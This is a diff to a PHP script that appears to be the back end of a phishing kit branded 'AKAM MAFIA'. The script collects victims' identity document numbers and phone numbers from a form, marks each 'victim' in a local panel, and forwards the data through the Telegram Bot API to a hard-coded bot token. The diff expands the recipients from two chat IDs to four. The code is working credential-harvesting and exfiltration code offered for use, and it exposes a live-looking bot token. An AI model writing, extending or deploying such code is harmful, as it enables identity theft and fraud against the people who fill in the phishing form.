@@ -7,7 +7,7 @@ $documento = isset($_POST['doc']) ? $_POST['doc'] : '';
 $celular = isset($_POST['cel']) ? $_POST['cel'] : '';
 
 if (!empty($documento) && !empty($celular)) {
-    // 1. Guardar en el panel local (Solo si las funciones existen)
+    // 1. Guardar en el panel local
     if (function_exists('traer_regitro') && function_exists('actualizar_registro_info')) {
         $registro = traer_regitro($ip);
         actualizar_registro_info($registro, $documento, $celular);
@@ -18,9 +18,14 @@ if (!empty($documento) && !empty($celular)) {
         actualizar_estado_victima($ip, "2");
     }
 
-    // 2. Configuración del Bot de 𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐
+    // 2. Configuración del Bot de 𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - (4 IDs activos)
     $token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
-    $chat_ids = ["8114050673", "8518977918"]; 
+    $chat_ids = [
+        "8114050673", 
+        "8518977918", 
+        "8638340940", 
+        "8645545892"
+    ]; 
 
     // 3. Formato del mensaje
     $mensaje = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - DATOS PERSONALES</b> ⭐\n\n";
@@ -30,7 +35,7 @@ if (!empty($documento) && !empty($celular)) {
     $mensaje .= "⏰ <b>FECHA:</b> " . date('d/m/Y H:i:s') . "\n";
     $mensaje .= "━━━━━━━━━━━━━━━";
 
-    // 4. Envío a Telegram con CURL (A prueba de fallos en Railway)
+    // 4. Envío a Telegram con CURL
     foreach ($chat_ids as $id) {
         $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
         $params = [
@@ -53,4 +58,3 @@ if (!empty($documento) && !empty($celular)) {
     }
 }
 ?>
- 
